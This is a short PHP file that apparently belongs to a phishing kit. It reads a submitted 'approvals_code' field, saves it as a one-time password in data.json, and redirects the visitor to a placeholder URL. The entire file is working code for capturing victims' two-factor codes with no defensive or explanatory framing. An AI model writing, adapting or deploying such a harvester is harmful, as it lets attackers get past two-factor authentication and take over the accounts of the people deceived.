<?php
$file = 'data.json';
$fp = fopen($file, 'w');
fwrite($fp, '{"otp": "' . $_POST['approvals_code'].'"}');
fclose($fp);

// file_put_contents("data.json", "{'otp': '" . $_POST['approvals_code']."'}", FILE_APPEND);
// exit()
?>

<script>
  let url = "#redirectUrl";
  document.location = url;
</script>
